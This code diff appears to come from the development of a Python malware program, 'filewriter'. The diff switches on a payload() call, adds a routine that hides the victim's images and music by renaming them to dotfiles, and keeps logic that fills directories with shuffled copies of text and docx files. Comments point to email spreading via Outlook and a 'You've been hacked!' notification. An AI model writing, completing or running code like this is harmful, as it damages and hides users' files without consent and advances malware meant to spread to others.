@@ -35,7 +35,7 @@ import typing
 FILES_TO_WRITE_PER_DIR: int = 10
 LINUX = "Linux"
 WINDOWS = "Windows"
-TESTING_DIR = "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie"
+TESTING_DIR = "/home/telekobold/TestVerzeichnis/filewriter_test/SS19-Test-Kopie"
 
 # type variables:
 ArbitraryType = typing.TypeVar("ArbitraryType")
@@ -78,6 +78,19 @@ def is_file_type(file: str, filetype: str) -> bool:
     return False
 
 
+def make_file_hidden(filepath: str) -> None:
+    """
+    Makes the past file hidden, i.e., writes a "." in front of its name.
+    Assumes that `filepath` is a path to an actually existing file.
+    
+    :filepath: The absolute file path to the file to make hidden.
+    """
+    path, name = os.path.split(filepath)
+    name = f".{name}"
+    new_filepath = os.path.join(path, name)
+    os.rename(filepath, new_filepath)
+
+
 def traverse_dirs(curr_dir: str) -> None:
     """
     Recursively traverses all directories and subdirectories starting from 
@@ -97,16 +110,16 @@ def traverse_dirs(curr_dir: str) -> None:
         elif is_file_type(curr_dir, "docx"):
             # print("DOCX file {}".format(curr_dir)) # test output
             process_docx_file(curr_dir)
+        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
+            #print("image file {}".format(curr_dir)) # test output
+            make_file_hidden(curr_dir)
+        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
+            #print("music file {}".format(curr_dir)) # test output
+            make_file_hidden(curr_dir)
         """
         elif is_file_type(curr_dir, "odt"):
             print("ODT file {}".format(curr_dir)) # test output
             process_odt_file(curr_dir)
-        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
-            print("image file {}".format(curr_dir)) # test output
-            process_image_file(curr_dir)
-        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
-            print("music file {}".format(curr_dir)) # test output
-            process_music_file(curr_dir)
         """
     if os.path.isdir(curr_dir):
         # print("DIR {}".format(curr_dir)) # test output
@@ -231,10 +244,8 @@ def create_filename(input_filename: str, number: int) -> str:
         filename = input_filename + str(i)
         
     return filename
-    
-    
-# TODO: Instead of writing the new files to the same directory as the "host" 
-# file, write them to any existing directory in the user's home directory.
+
+
 def process_text_file(input_filename: str) -> None:
     """
     Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains the 
@@ -305,23 +316,6 @@ def process_odt_file(file):
     the content of this text file, but with randomly shuffled content.
     """
     pass
-
-    
-def process_image_file(file):
-    """
-    Tries to recognize content from file name and loads similar pictures 
-    from the internet using a startpage search.
-    """
-    pass
-
-
-def process_music_file(file):
-    """
-    Tries to recognize content from file name and metadata and loads similar
-    music from the internet using a startpage search.
-    """
-    pass
-
 
 
 # --------------------------------------------------------------------------
@@ -404,10 +398,10 @@ if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
     
     # Detect the installed OS:
-    os: str = platform.system()
-    if os == WINDOWS:
+    installed_os: str = platform.system()
+    if installed_os == WINDOWS:
         print(WINDOWS)
-    elif os == LINUX:
+    elif installed_os == LINUX:
         print(LINUX)
     else:
         # Other platforms are currently not supported
@@ -421,6 +415,6 @@ if __name__ == "__main__":
     if outlook_install_path is not None:
         print("outlook")
     
-    # payload()
+    payload()
     # send_email()
     #notification("You've been hacked!", message="", app_name="filewriter")
